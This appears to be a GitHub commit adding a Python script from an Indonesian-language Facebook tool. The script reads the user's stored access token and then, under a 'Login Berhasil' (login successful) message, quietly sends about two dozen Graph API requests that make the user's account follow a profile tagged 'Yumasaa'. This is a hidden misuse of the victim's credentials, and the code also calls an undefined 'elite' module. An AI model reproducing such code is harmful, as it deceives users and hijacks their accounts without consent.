e49a635a381cba22f6ec0ce655914d0a007473d8
Ndrii Sanz <91232805+Ndrii-Sanz@users.noreply.github.com>
2021-10-31 13:17:55 +0700

    Add files via upload

---
+++ bot_follow_premium.py
@@ -0,0 +1,45 @@
+import requests,os,json
+import premium
+
+P = "\x1b[0;97m" # Putih
+M = "\x1b[0;91m" # Merah
+O = "\x1b[0;96m" # Biru Muda
+
+def main():
+    try:
+        token = open("token.txt","r").read()
+        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
+        a = json.loads(otw.text)
+        nama = a["name"]
+    except (KeyError,IOError):
+        print('%s║'%(M))
+        print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
+        os.system('rm -rf token.txt')
+        exit(elite.menu_log())
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token)      # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/Yumasaa/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token)       # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token)      # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token)      # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token)        # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
+    print('%s║'%(O))
+    print('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P))
+    exit(elite.menu())
